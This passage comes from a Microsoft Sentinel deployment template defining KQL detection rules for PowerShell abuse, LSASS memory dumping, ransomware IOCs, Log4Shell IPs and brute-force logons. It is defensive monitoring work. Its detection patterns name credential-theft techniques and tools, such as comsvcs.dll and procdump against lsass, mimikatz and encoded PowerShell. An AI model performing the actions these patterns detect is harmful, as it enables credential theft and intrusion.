          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "712fab52-2a7d-401e-a08c-ff939cc7c25e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "userPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "AccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetResourceDisplayName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.2.8"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/9ee54d4b-0cd2-48c5-9cfb-fc0eaf6d0167')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/9ee54d4b-0cd2-48c5-9cfb-fc0eaf6d0167')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Suspicious PowerShell and LSASS Memory Dumbing Activity",
          "description": "identify suspicious PowerShell activity, such as downloading files, executing encoded commands, and dumping LSASS memory.",
          "severity": "High",
          "enabled": true,
          "query": "// Created by AMayor on 9/27/24\n// Query Security Events for suspicious PowerShell activity and LSASS memory dumps\nSecurityEvent\n| where EventID == 4688  // Process Creation events\n| where ProcessName == \"powershell.exe\" or ProcessName == \"rundll32.exe\"  // Focus on PowerShell or Rundll32\n| extend CommandLine = tostring(CommandLine), ParentProcessName = tostring(ParentProcessName)\n| where CommandLine has_any (\"-enc\", \"-EncodedCommand\", \"-exec bypass\", \"Invoke-WebRequest\", \"Start-BitsTransfer\")  // PowerShell suspicious flags\n   or CommandLine contains \"rundll32.exe\" and CommandLine contains \"comsvcs.dll\" and CommandLine contains \"lsass\"  // LSASS dump\n   or CommandLine contains \"procdump.exe\" and CommandLine contains \"lsass\"  // Looking for LSASS dumping with ProcDump\n| project TimeGenerated, Computer, Account, ProcessName, CommandLine, ParentProcessName\n// Query for any processes downloading tools from suspicious URIs using PowerShell\n| union (\n    SecurityEvent\n    | where EventID == 4688  // Process Creation events\n    | where ProcessName == \"powershell.exe\"  // PowerShell executions\n    | extend CommandLine = tostring(CommandLine)\n    | where CommandLine contains \"Invoke-WebRequest\" or CommandLine contains \"Start-BitsTransfer\"  // Look for downloads via PowerShell\n    | where CommandLine contains \"http://\" or CommandLine contains \"https://\"  // Focus on internet-based downloads\n    | project TimeGenerated, Computer, Account, ProcessName, CommandLine, ParentProcessName\n)\n\n",
          "queryFrequency": "PT30M",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "CredentialAccess",
            "Collection",
            "Execution"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/9cdd260f-96f8-44b4-8910-d46da5186e3e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/9cdd260f-96f8-44b4-8910-d46da5186e3e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Kofurlak Ransomware IOC Detection",
          "description": "This detection rule monitors for indicators of compromise (IOCs) related to the Kofurlak ransomware family, which is based on leaked LockBit v3 source code. It focuses on suspicious file hashes, processes, command-line arguments, and non-standard execution directories such as Downloads and Temp.",
          "severity": "High",
          "enabled": true,
          "query": "// Define the list of suspicious file hashes\nlet ioc_hashes = dynamic([\n    \"078163d5c16f64caa5a14784323fd51451b8c831c73396b967b4e35e6879937b\",\n    \"2d5ab6c2da86c853d53837610cd149680523b8ea9677d78d571355fb8086fa2b\",\n    \"397f99f56e3cfa40d8b65ad33f7373931d7f38e153ff21c20cd6aab064337c3b\",\n    \"42feb6019bd906c97a2877f1ae3e8219ee65ba4d763c3e161430c50c1ae4e6eb\",\n    \"5368db3834ce46da5a42c7775c1a300bc7680d2dde6fbc1a74273a51f979905b\"\n]);\n// Define the suspicious command line keywords\nlet ioc_commands = dynamic([\n    \"psexec.exe\", \"mimikatz.exe\", \"procdump.exe\", \"open.exe\", \"windebug.exe\"\n]);\n// Define suspicious parent processes and specific directories (non-system)\nlet suspicious_parents = dynamic([\"cmd.exe\", \"powershell.exe\", \"explorer.exe\"]);\nlet suspicious_dirs = dynamic([\"Downloads\", \"Temp\", \"AppData\"]);\n// Query Security Events for Process Creation (Event ID 4688) with parent process conditions\nSecurityEvent\n| where EventID == 4688  // Process Creation events\n| extend CommandLine = tostring(CommandLine), FileHash = tostring(FileHash), ParentProcess = tostring(ParentProcessName)\n| where CommandLine has_any (ioc_commands) or FileHash in (ioc_hashes)  // Match suspicious commands or file hashes\n| where ParentProcess in (suspicious_parents)  // Only when launched by suspicious parent processes\n| where ProcessName !contains \"C:\\\\Windows\\\\\"  // Exclude processes running from system directories\n| where CommandLine has_any (suspicious_dirs)  // Focus on non-standard directories (e.g., Downloads, Temp)\n| project TimeGenerated, Computer, Account, ProcessName, CommandLine, FileHash, ParentProcess, ParentProcessName\n\n",
          "queryFrequency": "PT30M",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Execution",
            "Persistence",
            "CommandAndControl",
            "Exfiltration",
            "LateralMovement"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/7c006e2b-3571-4193-8ee9-fdab0405b388')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/7c006e2b-3571-4193-8ee9-fdab0405b388')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Failed AzureAD logons but success logon to host",
          "description": "Identifies a list of IP addresses with a minimum number (default of 5) of failed logon attempts to Azure Active Directory.\nUses that list to identify any successful remote logons to hosts from these IPs within the same timeframe.",
          "severity": "Medium",
          "enabled": true,
          "query": "//Adjust this threshold to fit the environment\nlet signin_threshold = 5;\n//Make a list of all IPs with failed signins to AAD above our threshold\nlet aadFunc = (tableName:string){\nlet suspicious_signins =\ntable(tableName)\n| where ResultType !in (\"0\", \"50125\", \"50140\")\n| where IPAddress !in ('127.0.0.1', '::1')\n| summarize count() by IPAddress\n| where count_ > signin_threshold\n| summarize make_set(IPAddress);\n//See if any of these IPs have sucessfully logged into *nix hosts\nlet linux_logons =\nSyslog\n| where Facility contains \"auth\" and ProcessName != \"sudo\"\n| where SyslogMessage has \"Accepted\"\n| extend SourceIP = extract(\"(([0-9]{1,3})\\\\.([0-9]{1,3})\\\\.([0-9]{1,3})\\\\.(([0-9]{1,3})))\",1,SyslogMessage)\n| where SourceIP in (suspicious_signins)\n| where Computer !contains \"CG\"\n| extend Reason = \"Multiple failed AAD logins from IP address\"\n| project TimeGenerated, Computer, HostIP, IpAddress = SourceIP, SyslogMessage, Facility, ProcessName, Reason;\n//See if any of these IPs have sucessfully logged into Windows hosts\nlet win_logons = (union isfuzzy=true\n(SecurityEvent\n| where EventID == 4624\n| where LogonType in (10, 7, 3)\n| where IpAddress != \"-\"\n| where IpAddress in (suspicious_signins)\n| extend Reason = \"Multiple failed AAD logins from IP address\"\n| project TimeGenerated, Account, AccountType, Computer, Activity, EventID, LogonProcessName, IpAddress, LogonTypeName, TargetUserSid, Reason\n),\n(WindowsEvent\n| where EventID == 4624 and has_any_ipv4(EventData, toscalar(suspicious_signins))\n| extend LogonType = tostring(EventData.LogonType)\n| where LogonType in (10, 7, 3)\n| extend  IpAddress = tostring(EventData.IpAddress)\n| where IpAddress != \"-\"\n| where IpAddress in (suspicious_signins)\n| where Computer !contains \"CG\"\n| extend Reason = \"Multiple failed AAD logins from IP address\"\n| extend Activity = \"4624 - An account was successfully logged on.\"\n| extend Account =  strcat(tostring(EventData.TargetDomainName),\"\\\\\", tostring(EventData.TargetUserName))\n| extend TargetUserSid = tostring(EventData.TargetUserSid)\n| extend TargetAccount = strcat(EventData.TargetDomainName,\"\\\\\", EventData.TargetUserName)\n| extend AccountType =case(Account endswith \"$\" or TargetUserSid in (\"S-1-5-18\", \"S-1-5-19\", \"S-1-5-20\"), \"Machine\", isempty(TargetUserSid), \"\", \"User\")\n| extend LogonProcessName = tostring(EventData.LogonProcessName)\n| project TimeGenerated, Account, AccountType, Computer, Activity, EventID, LogonProcessName, IpAddress, TargetUserSid, Reason\n)\n);\nunion isfuzzy=true linux_logons,win_logons\n| extend timestamp = TimeGenerated, AccountCustomEntity = Account, IPCustomEntity = IpAddress, HostCustomEntity = Computer\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n| where IpAddress !contains \"169.2\" and IpAddress !contains \"158.96\" //exclude internal IP callouts",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "CredentialAccess"
          ],
          "techniques": [
            "T1078",
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "8ee967a2-a645-4832-85f4-72b635bcb3a6",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5ad54a99-ed31-4460-b9c8-aa103deba09e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5ad54a99-ed31-4460-b9c8-aa103deba09e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Log4j vulnerability exploit aka Log4Shell IP IOC",
          "description": "Identifies a match across various data feeds for IP IOCs related to the Log4j vulnerability exploit aka Log4Shell described in CVE-2021-44228.\n References: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228",
          "severity": "High",
          "enabled": true,
          "query": "let IPList = externaldata(IPAddress:string)[@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/Log4j_IOC_List.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}';\n//Network logs\nlet CSlogSourceIP = CommonSecurityLog | summarize by IPAddress = SourceIP, Type;\nlet CSlogDestIP = CommonSecurityLog | summarize by IPAddress = DestinationIP, Type;\nlet CSlogMsgIP = CommonSecurityLog | extend MessageIP = extract(IPRegex, 0, Message) | summarize by IPAddress = MessageIP, Type;\nlet DnsIP = DnsEvents | summarize by IPAddress = IPAddresses, Type;\n// If you have enabled the _Im_Dns and/or imNetworkSession normalization in your workspace, you can uncomment one or both below.  Reference - https://docs.microsoft.com/azure/sentinel/normalization\n//let imDnsIP = _Im_Dns (response_has_any_prefix=IPList) | summarize by IPAddress = ResponseName, Type;\n//let imNetSessIP = imNetworkSession (dstipaddr_has_any_prefix=IPList) | summarize by IPAddress = DstIpAddr, Type;\n//Cloud service logs\nlet officeIP = OfficeActivity | summarize by IPAddress = ClientIP, Type;\nlet signinIP = SigninLogs | summarize by IPAddress, Type;\nlet nonintSigninIP = AADNonInteractiveUserSignInLogs | summarize by IPAddress, Type;\nlet azureActIP = AzureActivity | summarize by IPAddress = CallerIpAddress, Type;\nlet awsCtIP = AWSCloudTrail | summarize by IPAddress = SourceIpAddress, Type;\n//Device logs\nlet vmConnSourceIP = VMConnection | summarize by IPAddress = SourceIp, Type;\nlet vmConnDestIP = VMConnection | summarize by IPAddress = DestinationIp, Type;\nlet iisLogIP = W3CIISLog | summarize by IPAddress = cIP, Type;\nlet devNetIP = DeviceNetworkEvents | summarize by IPAddress = RemoteIP, Type;\n//need to parse to get IP\nlet azureDiagIP = AzureDiagnostics | where ResourceType == \"AZUREFIREWALLS\" | where Category in (\"AzureFirewallApplicationRule\", \"AzureFirewallNetworkRule\")\n| where msg_s has_any (IPList) | parse msg_s with Protocol 'request from ' SourceHost ':' SourcePort 'to ' DestinationHost ':' DestinationPort '. Action:' Action | summarize by IPAddress = DestinationHost, Type;\nlet sysEvtIP = Event | where Source == \"Microsoft-Windows-Sysmon\" | where EventID == 3 | where EventData has_any (IPList) | extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend SourceIP = tostring(EventDetail.[9].[\"#text\"]), DestinationIP = tostring(EventDetail.[14].[\"#text\"])\n| where SourceIP in (IPList) or DestinationIP in (IPList) | extend IPAddress = iff(SourceIP in (IPList), SourceIP, DestinationIP) | summarize by IPAddress, Type;\n// If you have enabled the _Im_DNS and/or imNetworkSession normalization in your workdspace, you can uncomment below and include. Reference - https://docs.microsoft.com/azure/sentinel/normalization\n//let ipsort = union isfuzzy=true CSlogDestIP, CSlogMsgIP, CSlogSourceIP, DnsIP, officeIP, signinIP, nonintSigninIP, azureActIP, awsCtIP, vmConnDestIP, vmConnSourceIP, azureDiagIP, sysEvtIP, imDnsIP, imNetSessIP\n// If you uncomment above, then comment out the line below\nlet ipsort = union isfuzzy=true CSlogDestIP, CSlogMsgIP, CSlogSourceIP, DnsIP, officeIP, signinIP, nonintSigninIP, azureActIP, awsCtIP, vmConnDestIP, vmConnSourceIP, azureDiagIP, sysEvtIP\n| summarize by IPAddress\n| where isnotempty(IPAddress) | where not(ipv4_is_private(IPAddress)) and IPAddress !in ('0.0.0.0','127.0.0.1');\nlet ipMatch = ipsort | where IPAddress in (IPList);\n(union isfuzzy=true\n(CommonSecurityLog\n| where SourceIP in (ipMatch) or DestinationIP in (ipMatch) or Message has_any (ipMatch)\n| where Message !contains \"denied\"\n| where Message !contains \"Deny\"\n| project TimeGenerated, SourceIP, DestinationIP, Message, SourceUserID, RequestURL, Type\n| extend MessageIP = extract(IPRegex, 0, Message)\n| extend IPMatch = case(SourceIP in (ipMatch), \"SourceIP\", DestinationIP in (ipMatch), \"DestinationIP\", MessageIP in (ipMatch), \"Message\", \"No Match\")\n| extend timestamp = TimeGenerated, IPEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, IPMatch == \"Message\", MessageIP, \"No Match\")\n),\n(OfficeActivity\n| where  ClientIP in (ipMatch)\n| project TimeGenerated, UserAgent, Operation, RecordType, UserId, ClientIP, Type\n| extend SourceIPAddress = ClientIP, Account = UserId\n| extend timestamp = TimeGenerated , IPEntity = SourceIPAddress , AccountEntity = Account\n),\n(DnsEvents\n| where  IPAddresses has_any (ipMatch)\n| project TimeGenerated, Computer, IPAddresses, Name, ClientIP, Type\n| extend DestinationIPAddress = IPAddresses,  Host = Computer\n| extend timestamp = TimeGenerated, IPEntity = DestinationIPAddress, HostEntity = Host\n),\n(VMConnection\n| where SourceIp in (ipMatch) or DestinationIp in (ipMatch)\n| project TimeGenerated, Computer, SourceIp, DestinationIp, Type\n| extend IPMatch = case( SourceIp in (ipMatch), \"SourceIP\", DestinationIp in (ipMatch), \"DestinationIP\", \"None\")\n| extend timestamp = TimeGenerated , IPEntity = case(IPMatch == \"SourceIP\", SourceIp, IPMatch == \"DestinationIP\", DestinationIp, \"None\"), Host = Computer\n),\n(Event\n| where Source =~ \"Microsoft-Windows-Sysmon\"\n| where EventID == 3\n| where EventData has_any (ipMatch)\n| project TimeGenerated, EventData, UserName, Computer, Type\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend SourceIP = tostring(EventDetail.[9].[\"#text\"]), DestinationIP = tostring(EventDetail.[14].[\"#text\"])\n| where SourceIP in (ipMatch) or DestinationIP in (ipMatch)\n| extend IPMatch = case( SourceIP in (ipMatch), \"SourceIP\", DestinationIP in (ipMatch), \"DestinationIP\", \"None\")\n| extend timestamp = TimeGenerated, AccountEntity = UserName, HostEntity = Computer , IPEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"None\")\n),\n(SigninLogs\n| where IPAddress in (ipMatch)\n| project TimeGenerated, UserPrincipalName, IPAddress, Type\n| extend timestamp = TimeGenerated, AccountEntity = UserPrincipalName, IPEntity = IPAddress\n),\n(AADNonInteractiveUserSignInLogs\n| where IPAddress in (ipMatch)\n| project TimeGenerated, UserPrincipalName, IPAddress, Type\n| extend timestamp = TimeGenerated, AccountEntity = UserPrincipalName, IPEntity = IPAddress\n),\n(W3CIISLog\n| where cIP in (ipMatch)\n| project TimeGenerated, Computer, cIP, csUserName, Type\n| extend timestamp = TimeGenerated, IPEntity = cIP, HostEntity = Computer, AccountEntity = csUserName\n),\n(AzureActivity\n| where CallerIpAddress in (ipMatch)\n| project TimeGenerated, CallerIpAddress, Caller, Type\n| extend timestamp = TimeGenerated, IPEntity = CallerIpAddress, AccountEntity = Caller\n),\n(\nAWSCloudTrail\n| where SourceIpAddress in (ipMatch)\n| project TimeGenerated, SourceIpAddress, UserIdentityUserName, Type\n| extend timestamp = TimeGenerated, IPEntity = SourceIpAddress, AccountEntity = UserIdentityUserName\n),\n(\nDeviceNetworkEvents\n| where RemoteIP in (ipMatch)\n| where ActionType =~ \"InboundConnectionAccepted\"\n| project TimeGenerated, RemoteIP, DeviceName, Type\n| extend timestamp = TimeGenerated, IPEntity = RemoteIP, HostEntity = DeviceName\n),\n(\nAzureDiagnostics\n| where ResourceType =~ \"AZUREFIREWALLS\"\n| where Category in (\"AzureFirewallApplicationRule\", \"AzureFirewallNetworkRule\")\n| where msg_s has_any (ipMatch)\n| project TimeGenerated, msg_s, Type\n| parse msg_s with Protocol 'request from ' SourceIP ':' SourcePort 'to ' DestinationIP ':' DestinationPort '. Action:' Action\n| where DestinationIP has_any (ipMatch)\n| extend timestamp = TimeGenerated, IPEntity = DestinationIP\n)\n// If you have enabled the _Im_Dns and/or imNetworkSession normalization in your workdspace, you can uncomment below and include. Reference - https://docs.microsoft.com/azure/sentinel/normalization\n//,\n//(_Im_Dns (response_has_any_prefix=IPList)\n//| project TimeGenerated, ResponseName, SrcIpAddr, Type\n//| extend DestinationIPAddress = ResponseName,  Host = SrcIpAddr\n//| extend timestamp = TimeGenerated, IPEntity = DestinationIPAddress, HostEntity = Host\n//),\n//(imNetworkSession (dstipaddr_has_any_prefix=IPList)\n//| project TimeGenerated, DstIpAddr, SrcIpAddr, Type\n//| extend timestamp = TimeGenerated, IPEntity = DstIpAddr, HostEntity = SrcIpAddr\n//)\n)\n| extend Name = tostring(split(AccountEntity, '@', 0)[0]), UPNSuffix = tostring(split(AccountEntity, '@', 1)[0])\n| extend HostName = tostring(split(HostEntity, '.', 0)[0]), DnsDomain = tostring(strcat_array(array_slice(split(HostEntity, '.'), 1, -1), '.'))\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "6e575295-a7e6-464c-8192-3e1d8fd6a990",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.6"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/af980553-0db4-4cde-8363-1939763f4d7e')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/af980553-0db4-4cde-8363-1939763f4d7e')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TI map File Hash to DeviceFileEvents Event",
          "description": "Identifies a match in DeviceFileEvents Event data from any FileHash IOC from TI",
          "severity": "Medium",
          "enabled": true,
          "query": "let dt_lookBack = 1h;\nlet ioc_lookBack = 14d;\nlet HashExceptions = datatable(FileHashValue: string)// File Exception List of known legit hashes- added by AMayor on 9/5/24\n[\n    \"9eb3a04ed889c1bd40d295d90bf7d1ef91b1866be82a4340bc81b3970e0b01a9\",\n    \"80678203bd0203a6594f4e330b22543c0de5059382bb1c9334b7868b8f31b1bc\",\n    \"e9c4f5eed186cb129c527c4b8d67d163ea2f2396e9d8b96e30b5e7c12203ce84\",\n    \"8e7fe1a1f3550c479ffd86a77bc9d10686d47f8727025bb891d8f4f0259354c8\",\n    \"3529e11ac45439899a3421cfd85ca0a5132c6d8015b6fdfe3e3544075223a769\",\n    \"06918cf99ad26cd6cf106881c0d5bdb212dc0bac4549805c9f5906e3d03d152c\",\n    \"8e7fe1a1f3550c479ffd86a77bc9d10686d47f8727025bb891d8f4f0259354c8\",\n    \"e9c4f5eed186cb129c527c4b8d67d163ea2f2396e9d8b96e30b5e7c12203ce84\",\n    \"5e0f05c3c52bf8a1e6a7f0f9c96bbd621cf3155af680dfeb1333bb6e4f799789\",\n    \"5e0f05c3c52bf8a1e6a7f0f9c96bbd621cf3155af680dfeb1333bb6e4f799789\",\n    \"4f2aa94a2e345a32dae689176b86c644bef87081ff9daef8c77417731862031b\",\n    \"5a9d9b919cd6a05aecb690d4edf361be4cacc1bc4a50c28130bc8182888f8e43\",\n    \"c96d60551331a196dac54b745aa642cd078ef89b6f267146b705f2c2cbef052d\"\n];\nlet DeviceFileEvents_ = (union\n(DeviceFileEvents | where TimeGenerated > ago(dt_lookBack) | where isnotempty(SHA1) | extend FileHashValue = SHA1),\n(DeviceFileEvents | where TimeGenerated > ago(dt_lookBack) | where isnotempty(SHA256) | extend FileHashValue = SHA256) | where FileHashValue !in (HashExceptions));//Removes known Hashes from results - added by AMayor 9/5/24);\nlet Hashes = DeviceFileEvents_ | distinct FileHashValue;\nThreatIntelligenceIndicator\n| where isnotempty(FileHashValue)\n| where TimeGenerated > ago(ioc_lookBack)\n| where FileHashValue in (Hashes)\n| summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n| where Active == true and ExpirationDateTime > now()\n| where Description !contains_cs \"State: inactive;\" and Description !contains_cs \"State: falsepos;\"\n| join kind=innerunique (DeviceFileEvents_) on $left.FileHashValue == $right.FileHashValue\n| where TimeGenerated < ExpirationDateTime\n| summarize TimeGenerated = arg_max(TimeGenerated, *) by  IndicatorId, DeviceId\n| project TimeGenerated, TrafficLightProtocolLevel, Description, ActivityGroupNames, IndicatorId, ThreatType, FileHashValue, FileHashType, ExpirationDateTime, ConfidenceScore, ActionType, DeviceId, DeviceName, FolderPath, RequestAccountDomain, RequestAccountName, RequestAccountSid, MachineGroup\n| extend timestamp = TimeGenerated\n",
          "queryFrequency": "PT3H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "bc0eca2e-db50-44e6-8fa3-b85f91ff5ee7",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "RequestAccountName"
                },
                {
                  "identifier": "Sid",
                  "columnName": "RequestAccountSid"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "RequestAccountDomain"
                }
              ]
            },
            {
              "entityType": "FileHash",
              "fieldMappings": [
                {
                  "identifier": "Value",
                  "columnName": "FileHashValue"
                },
                {
                  "identifier": "Algorithm",
                  "columnName": "FileHashType"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "DeviceName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/15a4c773-3b0b-4ba5-a708-75df30fa69a0')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/15a4c773-3b0b-4ba5-a708-75df30fa69a0')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Remote Desktop Protocol - SharpRDP",
          "description": "This detection monitors for the behavior that SharpRDP exhibits on the target system. The most relevant is leveraging taskmgr.exe to gain elevated execution, which means that taskmgr.exe is creating unexpected child processes.  This query can be part of a security monitoring or threat-hunting effort to detect post-exploitation behaviors where an attacker may use tools like task manager to manipulate running processes, while attempting to hide behind legitimate system processes like WerFault.exe, mmc.exe, or resmon.exe.",
          "severity": "Medium",
          "enabled": true,
